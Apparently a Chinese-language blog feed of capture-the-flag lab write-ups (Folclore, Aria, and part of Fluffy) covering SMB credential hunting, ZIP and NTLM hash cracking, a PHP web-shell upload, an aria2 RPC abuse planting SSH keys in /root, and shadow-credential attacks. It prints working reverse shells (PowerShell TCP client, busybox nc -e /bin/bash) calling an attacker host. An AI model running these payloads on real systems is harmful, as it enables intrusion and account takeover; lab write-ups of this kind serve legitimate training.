su mirada guardaba el misterio del viento y la sabiduría, 
y con una sonrisa me confió que su clave más preciada tenía solo ocho caracteres, 
sencilla pero poderosa, como él mismo. Nuestros caminos se entrelazan: 
yo, guardiana de la luna y la vida; é     l, 
portador del cielo y el conocimiento, unidos bajo el manto eterno de las estrellas. 
Ahora, sigue adelante, porque Quetzalcóatl te espera. 
Continua buscando a Tláloc,te despejare el camino entregá     
ndote su clave: 677Kn$q."
```

密码是用户 `Tlaloc`  的

```bash
➜  Folclore nxc smb 192.168.56.101 -u Tlaloc -p '677Kn$q' --ignore-pw-decoding
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\Tlaloc:677Kn$q STATUS_PASSWORD_EXPIRED 
```

枚举 SMB

![image.png](/post-images/TheHackersLabsFolclore/image6.png)

照片 ++

![image.png](/post-images/TheHackersLabsFolclore/image7.png)

盲猜还是隐写，直接通过 `stegseek` 可以拿到文件

```bash
➜  Folclore stegseek Tlaloc.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "knight"
[i] Original filename: "Las primeras señales.txt".
[i] Extracting to "Tlaloc.jpg.out".
```

凭证 ++

```bash
➜  Folclore cat Tlaloc.jpg.out 
He conseguido estos últimos dos caracteres para la clave de Kukulcán, 
la serpiente emplumada que llaman Quetzalcóatl: 
%/. Te los entrego para que completes tu búsqueda. 
Además, aquí tienes otra clave, 
aunque debo confesar que no recuerdo a quién pertenece exactamente: 
45yD#k7. Confí     a en tu instinto para usarla sabiamente.
```

## ZIP crack

是用户 `La_mulata_de_Cordoba` 的凭据

```bash
➜  Folclore nxc smb 192.168.56.101 -u La_mulata_de_Cordoba -p '45yD#k7'
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\La_mulata_de_Cordoba:45yD#k7 STATUS_PASSWORD_EXPIRED
```

再枚举 `SMB` ，一个 txt 一个 ZIP

![image.png](/post-images/TheHackersLabsFolclore/image8.png)

TXT 得到一个账户 `La_Catrina:3nM93{S#`

```bash
➜  Folclore cat Mi_amiga.txt                                                   
Mi amiga ‘La Catrina’ me ha dejado su cuenta para que le ayude con algunos de sus trabajitos de vez en cuando. 
Escribiré la clave aquí para no olvidarla: 3nM93{S#
```

Zip 需要密码

```bash
➜  Folclore unzip Pacto.zip 
Archive:  Pacto.zip
   skipping: Pacto.txt               need PK compat. v5.1 (can do v4.6)
```

通过 `John` 进行爆破

```bash
➜  Folclore zip2john Pacto.zip > hash
➜  Folclore john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 238 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
celina           (Pacto.zip/Pacto.txt)     
1g 0:00:00:00 DONE (2025-09-24 18:26) 2.564g/s 42010p/s 42010c/s 42010C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`7z` 进行解压

```bash
➜  Folclore 7z x Pacto.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 432 bytes (1 KiB)

Extracting archive: Pacto.zip
--
Path = Pacto.zip
Type = zip
Physical Size = 432

    
Enter password (will not be echoed):
Everything is Ok

Size:       358
Compressed: 432
```

得到一个神秘字符串 `J9c`

```bash
➜  Folclore cat Pacto.txt 
Has surcado sendas que pocos se atreven a cruzar, 
pero tu viaje no concluye todavía. Invocando mis artes prohibidas, 
logré hechizar a la serpiente emplumada y robarle apenas el inicio de su secreto: 
sólo tres caracteres fui capaz de obtener. 
Ahora los deposito en tus manos, 
pero escucha el viento y no olvides la deuda que ahora te ata a mi sombra: J9c.
```

我们检查一下上面得到的用户能做的事情，还是一个 `txt`

![image.png](/post-images/TheHackersLabsFolclore/image9.png)

```bash
➜  Folclore cat Ultimo_mensaje.txt 
Solo puedo darte el quinto carácter de su clave: ‘U’. 
Los demás caracteres que faltan deberás encontrarlos por tu cuenta, 
aunque no debe ser tan difícil; solo son números o letras. 
Confía en tu ingenio y no olvides que el misterio siempre se revela a quien persevera.
```

## 密码爆破

集合上边的得到几个`txt`，得到密码应该是 `J9c?U?%/`，第四个字母需要我们进行爆破

```bash
➜  Folclore for char1 in {a..z} {A..Z} {0..9}; do printf "J9c%sU%s%%/\n" "$char1" "$char1"; done > wordlist.txt 
```

得到凭据 `Quetzalcoatl:J9c7U7%/`

```bash
➜  Folclore nxc smb 192.168.56.101 -u user.txt -p wordlist.txt --ignore-pw-decoding --continue-on-success | grep -v 'STATUS_LOGON_FAILURE'
SMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\Ninguno:J9caUa%/ (Guest)
SMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\Quetzalcoatl:J9c7U7%/
```

SMB 枚举…

![image.png](/post-images/TheHackersLabsFolclore/image10.png)

## xxxxx

查看得到的  `txt`

```bash
➜  Folclore cat /root/.nxc/modules/nxc_spider_plus/192.168.56.101/Viento/Serpiente\ Emplumada.txt 
Has recorrido con valentía y sabiduría un sendero lleno de retos; te felicito, guerrero del destino.
Ahora, confía en mí, Quetzalcóatl, la serpiente emplumada, pues seré yo quien te otorgue el acceso necesario. 
Solo ejecutaré una vez aquel archivo PowerShell que decidas subir, para abrir el portal hacia lo que buscas. 
Que esta acción sea el puente que te lleve a la verdad escondida entre los vientos y las estrellas.# 
```

表示我们可以上传 `Powershell` 文件一次

![image.png](/post-images/TheHackersLabsFolclore/image11.png)

将下面的代码保存为 `xxx.ps1` 然后进行上传

```bash
$client = New-Object Net.Sockets.TCPClient('192.168.56.5',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash
smbclient //192.168.56.101/viento -U Quetzalcoatl%'J9c7U7%/'
put shell.ps1
```

等待弹回来

![image.png](/post-images/TheHackersLabsFolclore/image12.png)

读取 `User.txt`

```bash
PS C:\Users\Quetzalcoatl\Desktop> type User.txt
456e20656c207669656e746f2079616365206c6120766572646164
```

为了方便操作迁移到 `msf` 

![image.png](/post-images/TheHackersLabsFolclore/image13.png)

上来后通过 winpeas 等枚举了许多，但是没找到可以利用的

最后可以在 `Downloads\Actualizacion` 中找到管理员密码

```bash
C:\Users\Quetzalcoatl\Downloads\Actualizacion>type Venganza.txt
type Venganza.txt
He conseguido la clave del administrador!!!
La guardare para no olvidarla: xxxxxxxx
```

```bash
➜  Folclore nxc smb 192.168.56.101 -u 'administrador' -p 'xxxxxx*'                        
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\administrador:xxxxxx (Pwn3d!)
```

拿 `root.txt` ，直接读就算了，懒得拿 `shell` 了

![image.png](/post-images/TheHackersLabsFolclore/image14.png)

## 总结

体验不算好
]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>MISC</category>
        </item>
        <item>
            <title><![CDATA[HackMyVM - Aria]]></title>
            <link>https://www.sunsetaction.top/2025/09/23/HackMyVMAria</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/23/HackMyVMAria</guid>
            <pubDate>Tue, 23 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Aria. https://hackmyvm.eu/machines/machine.php?vm=Aria Recon 端口扫描 80 端口 给出了一点信息 通过 md5(time()·rand(1,1000)) 生成不可预测的文件名 并且文件内容不可包含 <?php 以及文件名仅仅可以是 gif...]]></description>
            <content:encoded><![CDATA[
# Aria.

> https://hackmyvm.eu/machines/machine.php?vm=Aria
> 

![image.png](/post-images/HackMyVMAria/image.png)

## Recon

### 端口扫描

```bash
➜  Aria nmap -sT -min-rate 10000 -p- 192.168.56.214
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:23 CST
Nmap scan report for 192.168.56.214
Host is up (0.00037s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 08:00:27:9A:02:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
```

```bash
➜  Aria nmap -sT -A -p 22,80,1337 192.168.56.214
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:25 CST
Nmap scan report for 192.168.56.214
Host is up (0.00056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Ultra-Secure Naming Service
|_http-server-header: Apache/2.4.62 (Debian)
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck:
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|   GenericLines:
```

### 80 端口

给出了一点信息

- 通过 `md5(time()·rand(1,1000))` ****生成不可预测的文件名
- 并且文件内容不可包含 `<?php`
- 以及文件名仅仅可以是 gif / jpg / png

![image.png](/post-images/HackMyVMAria/image1.png)

`<?php` 可以通过 `<?=` 来绕过，文件名可以通过 `GIF89a` ，但是不可预测文件名需要想办法

### 1337 端口

扫描出来很奇怪，`nc` 一下

```
➜Aria nc 192.168.56.214 1337
--- Aria Debug Shell ---
--- Type 'exit' to quit ---

$ help
This shell aids admins in debugging Aria services.
Use specific commands to view logs or hidden path.
Note: Web interface also provides foothold access.
```

> 此 Shell 可帮助管理员调试 Aria 服务。
使用特定命令查看日志或隐藏路径。
注意：Web 界面也提供立足点访问权限。
> 

大概是可以通过特定命令来查看日志或隐藏路径

```bash
$ path
You're close! Try a command related to revealing paths.
$ path ls
You're close! Try a command related to revealing paths.
$ path dir
You're close! Try a command related to revealing paths.
$ path upload
You're close! Try a command related to revealing paths.
$ path ls -al
You're close! Try a command related to revealing paths.
$ path ls path
You're close! Try a command related to revealing paths.
$ path ll
You're close! Try a command related to revealing paths.
```

想不到，再看看 `web` 端

![image.png](/post-images/HackMyVMAria/image2.png)

### 爆破

受不了，直接跟它爆了

![BOOM-4x (2).gif](/post-images/HackMyVMAria/BOOM-4x_(2).gif)

```bash
import time
import hashlib
import requests
from datetime import datetime

# --- 配置区 ---
TARGET_IP = '192.168.56.214'
TARGET_PATH = '/uploads/'
FILE_EXTENSION = '.gif'
BASE_URL = f"http://{TARGET_IP}{TARGET_PATH}"

# 时间范围（秒）。例如 10 表示从当前时间的前10秒到后10秒
TIME_WINDOW_SECONDS = 10
# 随机数范围
RAND_MIN = 1
RAND_MAX = 1000

# --- 脚本核心逻辑 ---

def main():
    """主执行函数"""
    # 计算起始和结束时间戳
    current_time = int(time.time())
    start_time = current_time - TIME_WINDOW_SECONDS
    end_time = current_time + TIME_WINDOW_SECONDS

    # 打印任务信息
    print("=" * 52)
    print("开始爆破...")
    print(f"目标主机: {BASE_URL}")
    print("成功条件: 响应状态码不为 404")
    print(f"时间范围: {datetime.fromtimestamp(start_time)} -> {datetime.fromtimestamp(end_time)}")
    print(f"随机数范围: {RAND_MIN} - {RAND_MAX}")
    total_attempts = (end_time - start_time + 1) * RAND_MAX
    print(f"预计总尝试次数: {total_attempts:,}")
    print("=" * 52)

    # 使用 requests.Session() 可以复用TCP连接，提高效率
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }) # 添加一个常见的User-Agent，避免被一些简单的WAF拦截
    
    found = False
    counter = 0

    try:
        # 外层循环遍历时间戳
        for t in range(start_time, end_time + 1):
            # 内层循环遍历随机数
            for r in range(RAND_MIN, RAND_MAX + 1):
                # 1. 生成原始字符串
                original_string = f"{t}{r}"
                
                # 2. 计算 MD5 哈希
                md5_hash = hashlib.md5(original_string.encode('utf-8')).hexdigest()
                
                # 3. 构造完整的 URL
                url = f"{BASE_URL}{md5_hash}{FILE_EXTENSION}"
                
                # 实时显示进度
                counter += 1
                if counter % 500 == 0:
                    print(f"已尝试 {counter:,} 次, 当前时间戳: {t}    ", end='\r')

                try:
                    # 4. 发送 HEAD 请求检查
                    response = session.head(url, timeout=2, allow_redirects=True) # allow_redirects=True 可以跟随重定向
                    
                    # 5. 判断状态码 - 如果响应不是 404 Not Found，就认为是成功
                    if response.status_code != 404:
                        print("\n\n[+] 成功！发现一个非 404 响应！")
                        print(f"[+] 状态码: {response.status_code}") # 打印实际的状态码
                        print(f"[+] URL: {url}")
                        print(f"[+] 生成源: 时间戳={t}, 随机数={r}")
                        found = True
                        return # 找到后直接退出函数
                        
                except requests.exceptions.RequestException:
                    continue

    except KeyboardInterrupt:
        print("\n\n[!] 用户手动中断了脚本。")
    finally:
        print("\n" + "=" * 52)
        if not found:
            print("爆破完成，未找到有效文件。")
        print("脚本执行结束。")
        print("=" * 52)

if __name__ == "__main__":
    main()

```

测试一下

```bash
------geckoformboundary4729ee082d4576ee3503c0196092f36c
Content-Disposition: form-data; name="file"; filename="nneo.gif"
Content-Type: image/gif

GIF89a

------geckoformboundary4729ee082d4576ee3503c0196092f36c--
```

![image.png](/post-images/HackMyVMAria/image3.png)

写马子

```bash
------geckoformboundary4729ee082d4576ee3503c0196092f36c
Content-Disposition: form-data; name="file"; filename="nneo.gif"
Content-Type: image/gif

GIF89a
<?= phpinfo();exec($_GET['x']); ?>

------geckoformboundary4729ee082d4576ee3503c0196092f36c--
```

通过马子弹个 `shell`

```bash
?x=busybox+nc+192.168.56.5+1234+-e+%2Fbin%2Fbash
```

![image.png](/post-images/HackMyVMAria/image4.png)

可以拿到 `user.txt`

```bash
cat user.txt
flag{user-d13adadc6bbc1391394a5198cba2d1d7}
```

## 提权

### 信息收集

首先拿到完整 shell （略）

查看正在监听端口，发现本地开着 `6800`

```bash
www-data@Aria:/$ ss -tulpn
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        5                0.0.0.0:1337          0.0.0.0:*      
tcp     LISTEN   0        128            127.0.0.1:6800          0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128                    *:80                  *:*      
tcp     LISTEN   0        128                [::1]:6800             [::]:*      
tcp     LISTEN   0        128                 [::]:22               [::]:* 
```

通过 socat 转发出去

```bash
www-data@Aria:/tmp$ ./socat TCP-LISTEN:6801,fork TCP4:127.0.0.1:6800 &
[1] 25929
```

但貌似并不是 HTTP 服务，结合吧唧名称和搜索引擎，大致确定是 aria2 的 RPC 端口，应该能从上面拿到什么文件

> Aria2 是一款自由、跨平台命令行界面的下载管理器，该软件根据 GPLv2 许可证进行分发
> 

### Aria2 PRC - 1

找到官方文档，测试一下 PRC 接口

> https://aria2.github.io/manual/en/html/aria2c.html#terminology | https://aria2.github.io/manual/en/html/aria2c.html#json-rpc-over-websocket
> 

测试，确实有回显

```bash
➜  Aria curl 192.168.56.116:6801/jsonrpc
{"id":null,"jsonrpc":"2.0","error":{"code":-32600,"message":"Invalid Request."}}# 
```

测试一下方法，发现需要认证

> 要使用 RPC 方法级授权，用户必须使用 **`--rpc-secret`** 选项指定 RPC 秘密授权令牌
> 

```bash
➜  Aria curl '192.168.56.116:6801/jsonrpc?method=aria2.tellStatus&id=foo'                                   
{"id":"foo","jsonrpc":"2.0","error":{"code":1,"message":"Unauthorized"}}# 
```

### 零宽度字符

所以现在的目标是要找到 `Token`

最后发现 `user.txt` 不正常

![image.png](/post-images/HackMyVMAria/image5.png)

- **`E2 80 8B`**: 这是 UTF-8 编码下的 **零宽空格 (Zero-Width Space, ZWSP)**。它是一个在排版中用于在不断词的地方允许换行的字符，但它本身**完全不可见**，也不占据任何宽度。
- **`E2 80 8C`**: 这是 UTF-8 编码下的 **零宽非连接符 (Zero-Width Non-Joiner, ZWNJ)**。它也是一个**完全不可见**的控制字符。

这应该是零宽度字节隐写，通过在线工具进行解密，通过搜索引擎搜索：Zero-Width Space Steganography 能找到可用的在线工具，尝试了很多个，最后这个能用

> https://stegzero.com/
> 

![image.png](/post-images/HackMyVMAria/image6.png)

得到 `token: maze-sec`

### Aria2 PRC - 2

在文档中能看到上传的了例子，我们让 AI 进行修改一下，上传公钥文件

```bash
#!/usr/bin/python2
# -*- coding: utf-8 -*-

import urllib2
import json

# 1. Your attacker machine's IP address and web server port
attacker_ip = "192.168.56.5" 
attacker_port = 8080

# 2. The URL to your malicious authorized_keys file
payload_url = "http://{}:{}/authorized_keys".format(attacker_ip, attacker_port)

# 3. The secret token for the aria2 RPC interface
rpc_token = "maze-sec"

# 4. Build the aria2 JSON-RPC request
jsonreq = json.dumps({
    'jsonrpc': '2.0',
    'id': 'qwer',
    'method': 'aria2.addUri',
    'params': [
        "token:{}".format(rpc_token),  # <-- THIS IS THE CRUCIAL ADDITION
        [payload_url],                 # The URL list is now the second parameter
        {                              # The options object is now the third
            'dir': '/root/.ssh',
            'out': 'authorized_keys'
        }
    ]
})

print "Sending payload with token to aria2..."

# 5. Send the request
try:
    c = urllib2.urlopen('http://192.168.56.116:6801/jsonrpc', jsonreq)
    print "Payload sent successfully!"
    print "Server response:", c.read()
    print "\nCheck your web server logs to see if the file was downloaded."
    print "If successful, you should now be able to SSH as root."
except urllib2.HTTPError as e:
    print "HTTP Error:", e.code
    print "Response body:", e.read()
except Exception as e:
    print "An error occurred:", e
```

修改脚本后运行脚本，上传成功

![image.png](/post-images/HackMyVMAria/image7.png)

通过私钥进行登录，成功登录

![image.png](/post-images/HackMyVMAria/image8.png)

读取 `root.txt`

```bash
root@Aria:~# cat root.txt 
flag{root-374495cbd5d79b6e45b7778cbac070cc}
```

## 总结

Medium ？]]></content:encoded>
            <category>靶机</category>
            <category>HMV</category>
            <category>Aria2</category>
            <category>Zero-Width</category>
            <category>Space</category>
            <category>Steganography</category>
            <category>Brute</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Fluffy]]></title>
            <link>https://www.sunsetaction.top/2025/09/20/HackTheBoxSeason8 - Fluffy</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/20/HackTheBoxSeason8 - Fluffy</guid>
            <pubDate>Sun, 25 May 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season8 Fluffy https://app.hackthebox.com/machines/Fluffy | Windows · Easy Machine Information：As is common in real life Windows pentests, you will st...]]></description>
            <content:encoded><![CDATA[
# Season8 - Fluffy

> https://app.hackthebox.com/machines/Fluffy | `Windows` · `Easy`
> 

**Machine Information：**As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

## 前期踩点

```bash
➜ nmap -sT -min-rate 5000 -p- 10.10.11.69       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:53 EDT
Nmap scan report for 10.10.11.69
Host is up (0.15s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49695/tcp open  unknown
49701/tcp open  unknown
```

这次的靶机依旧是没有`Web` 

```bash
➜ nmap -sT -A -T4 -O -p 53,139,445 10.10.11.69                                                                                                                               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:59 EDT
Nmap scan report for 10.10.11.69
Host is up (0.16s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-25T11:38:32
|_  start_date: N/A
|_clock-skew: 6h38m59s

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   183.42 ms 10.10.16.1
2   183.81 ms 10.10.11.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.00 seconds

```

## 信息收集

### SMB

测试凭据

```bash
➜ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990!
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
```

枚举用户

```bash
➜  nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print $2}' | awk '{print $1}' 
Guest
krbtgt
DC01$
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
```

`SMB` 信息收集

```bash
➜ smbclient -L 10.10.11.69 -U fluffy.htb/j.fleischman%J0elTHEM4n1990!

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
➜ smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 25 08:21:54 2025
  ..                                  D        0  Sun May 25 08:21:54 2025
  0x5chltz.library-ms                 A      364  Sun May 25 08:13:39 2025
  1.lnk                               A     2164  Sun May 25 07:59:46 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A      317  Sun May 25 08:06:27 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A      317  Sun May 25 08:06:16 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1849449 blocks available
```

 `Upgrade_Notice.pdf` 像是渗透测试报告一样的东西

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image.png)

下边有披露的公开漏洞

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image1.png)

能看到有两个 `Critical` 漏洞以及两个 `High` 漏洞

### CVE-2025-24071

对比了两个漏洞 `CVE-2025-24996` 和 `CVE-2025-24071`

其中 `CVE-2025-24996` 网上文章并不多，而 `CVE-2025-24071` 会有复现文章，所以侧重于 `CVE-2025-24071`

复现文章：https://blog.csdn.net/weixin_42773448/article/details/146436061

工具：https://github.com/0x6rss/CVE-2025-24071_PoC

```bash
➜  CVE-2025-24071_PoC git:(main) python poc.py 
Enter your file name: doc
Enter IP (EX: 192.168.1.162): 10.10.16.16
completed
```

上传到 `IT`

```bash
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.8 kb/s) (average 0.8 kb/s)
```

同时开启`responder`监听

```bash
➜ responder -I tun0 -wd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
```

等一会能就接收到 `p.agila` 用户 `NET NTLM hash`

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image2.png)

```bash
p.agila::FLUFFY:56ab772ca1eae1e3:E1A831FDA20AA227AD2187ABCD5C3737:01010000000000008003A3D819CDDB010A2E54C0A8C85EC30000000002000800330037003200460001001E00570049004E002D0059005000570030004F00330051004D0053004500480004003400570049004E002D0059005000570030004F00330051004D005300450048002E0033003700320046002E004C004F00430041004C000300140033003700320046002E004C004F00430041004C000500140033003700320046002E004C004F00430041004C00070008008003A3D819CDDB01060004000200000008003000300000000000000001000000002000009850210C3B697422BCA38C6B2216E754DBFB52DA16AAC86C61528CEE298FC1640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000  
```

使用 `hashcat` 进行破解用户凭据

```bash
➜ hashcat -m 5600 'xxxx' /usr/share/wordlists/rockyou.txt 
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image3.png)

得到密码 `prometheusx-303` 

测试凭据

```bash
➜ crackmapexec smb 10.10.11.69 -u p.agila -p prometheusx-303
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
```

### BloodHound

这里使用 `BloodHound` 进行枚举域攻击路线

```bash
ntpdate -s 10.10.11.69 && bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' -ns 10.10.11.69 --zip -c All -dc DC.fluffy.htb
```

```bash
➜ ntpdate -s 10.10.11.69 && bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' -ns 10.10.11.69 --zip -c All -dc DC01.fluffy.htb
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 24S
INFO: Compressing output into 20250525091352_bloodhound.zip
```

用户 `p.agila` 属于 `SERVICE ACCOUNT MANGERS` 和 `SERVICE ACCOUNTS` 组，其中`SERVICE ACCOUNT MANGERS` 对 `SERVICE ACCOUNTS` 组有 `GenericAll` 权限

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image4.png)

然后远程服务用户 `WINRM_SVC` 等也是在 `SERVICE ACCOUNTS` 组内

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image5.png)

## 域渗透

### To Winrm_svc

可以使用 `GetUserSPNs` 获取服务用户 `HASH` 来进行破解

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image6.png)

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image7.png)

但是并无法破解成功，服务账户密码都是随机的…

影子用户(`Shadow Credential Attack`)启动

```bash
➜ certipy shadow auto -username "p.agila@fluffy.htb" -p "prometheusx-303" -account WINRM_SVC -dc-ip 10.10.11.69
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image8.png)

```bash
➜ export KRB5CCNAME=winrm_svc.ccache 
```

`evil-winrm` 登录

```bash
➜ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
```

`user.txt`

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
9e23a6ed83a674306f7fad569aa292bb
```

### 寻找攻击路线

继续寻找提权路线

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image9.png)

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image10.png)

